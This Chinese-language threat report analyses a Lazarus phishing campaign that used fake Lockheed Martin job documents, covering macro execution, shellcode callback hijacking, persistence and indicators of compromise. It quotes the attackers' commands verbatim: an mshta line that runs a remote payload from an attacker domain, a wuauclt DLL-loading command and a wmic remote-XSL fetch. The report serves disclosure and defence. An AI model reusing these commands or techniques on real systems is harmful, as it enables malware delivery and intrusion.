研究人员发现了 Lazarus
的新攻击行动，利用国防部门的就业岗位信息进行诱饵钓鱼，已经发现了针对洛克希德马丁公司的求职者的定向攻击。洛克希德马丁公司是一家美国航空航天、武器、国防、信息安全和技术公司，同类也有其他公司类似主题的诱饵文件，例如诺斯罗普·格鲁曼公司和
BAE 国防工业公司。

研究人员发现，Lazarus 组织首次使用 lolbin 技术，故而命名为 `LolZarus`。

## 诱饵文档

发现了两个钓鱼文档：`Lockheed_Martin_JobOpportunities.docx`和
`Salary_Lockheed_Martin_job_opportunities_confidential.doc`，都是由
`Mickey`用户创建的，其中的控制流劫持和宏代码基本一致。

![image.png-111.8kB](https://image.3001.net/images/20220219/1645241684_6210655497155422a9d86.png!small)诱饵文档

样本使用别名来重命名使用的 API：

![image.png-96kB](https://image.3001.net/images/20220219/1645241685_621065553a8fb6ef55b71.png!small)重命名

红代码的入口点是通过 ActiveX Frame1_Layout 在启用 ActiveX 控件后自动执行：

![image.png-27.8kB](https://image.3001.net/images/20220219/1645241685_621065559cdaa66e0e4f8.png!small)入口点

宏代码首先加载 `WMVCORE.DLL`，这是 Windows 合法 DLL 文件。为了使宏代码看起来更正常，Lazarus 使用与
WMVCORE.DLL 导出函数相同的函数名和相关主题的变量名。

![image.png-130.7kB](https://image.3001.net/images/20220219/1645241685_62106555e6abe21f42210.png!small)宏代码

宏代码在执行主要功能前要对文档变量进行检查，确保后续打开文档时不会重复执行。

## 第二阶段

二阶段的 Payload 作为 base64 编码的字符串数组嵌入在使用 CryptStringToBinaryW 函数解码的宏代码中。

![image.png-166.3kB](https://image.3001.net/images/20220219/1645241686_62106556627b0412c3efb.png!small)Payload

其他变种也有使用 UuidFromStringA 函数来解码的。

解码后的 Shellcode 检索所在地址并更改权限覆盖 `WMVCORE.dll`中的 WMIsAvailableOffline 函数。

![image.png-229.3kB](https://image.3001.net/images/20220219/1645241686_62106556dd95026eea365.png!small)内存操作

Shellcode 的回调是通过 NtQueryInformationProcess 从当前进程的 PEB 结构中检索
KernelCallbackTable 指针，然后使 _fnDWORD 指针以指向 WMIsAvailableOffline
来实现的。这种控制流劫持技术，也被其他攻击者所使用。Lazarus 也使用其他新方法来执行 Shellcode，例如使用函数
EnumSystemLocalesA 作为对写入可执行堆的 Shellcode 的回调。

接着，宏代码设置一个变量控制文档再打开不会重复执行，并通过
`https://markettrendingcenter.com/lk_job_oppor.docx`下载诱饵文档并显示。

![image.png-196.5kB](https://image.3001.net/images/20220219/1645241688_6210655800c2e1ac4a28e.png!small)诱饵文档

Shellcode 通过创建一个新的临时文件夹（C:\WMAuthorization），写入一个 VBS
文件（WMVxEncd.vbs）。再创建一个对应的计划任务（<https://markettrendingcenter.com/member.htm>）实现每二十分钟执行一次
VBS 文件。

    
    
    shellObj.Run "forfiles /p c:\windows /m HelpPane.exe /c ""mshta C:\WMAuthorization\WMPlaybackSrv ""https://markettrendingcenter.com/member.htm""""", 0, True

![image.png-330.5kB](https://image.3001.net/images/20220219/1645241688_6210655894f6d9bbe91de.png!small)计划任务

代码中 WMPlaybackSrv 是重命名的 wscript.exe，WindowsMediaPlayerVxEncdSrv 是重命名的
mshta.exe。在其他变种中，也使用过 lolbin wuauclt。

    
    
    cmd /C ''C:\Windows\system32\wuauclt.exe' /UpdateDeploymentProvider wuaueng.dll /RunHandlerComServer

早期的变种也使用了 wmic：

    
    
    %COMSPEC% /c Start /miN c:\Intel\hidasvc ENVIRONMENT get STATUS /FORMAT:”hxxps://www.advantims[.]com/GfxCPL.xsl”

其他安全厂商也发现了使用 pcalua.exe 的变种。但在分析时，远程的 htm 文件已经不存在了，无法接续分析。

## 结论

本次发现的变种文件，与此前发现的 Lazarus 攻击使用的宏代码、攻击流程和钓鱼主题存在大量重合。

Lazarus 利用各种 Shellcode 执行技术并将 lolbins 作为攻击中的一部分，持续发起复杂攻击。

## IOC

> e87b575b2ddfb9d4d692e3b8627e3921  
> a27a9324d282d920e495832933d486ee  
> 3f326da2affb0f7f2a4c5c95ffc660cc  
> 490c885dc7ba0f32c07ddfe02a04bbb9  
> 712a8e4d3ce36d72ff74b785aaf18cb0  
> a27a9324d282d920e495832933d486ee  
> f2a0e9034d67f8200993c4fa8e4f5d15  
> markettrendingcenter.com  
> lm-career.com  
> advantims.com

## 参考来源

> [Qualys](https://blog.qualys.com/vulnerabilities-threat-> research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-> campaigns)

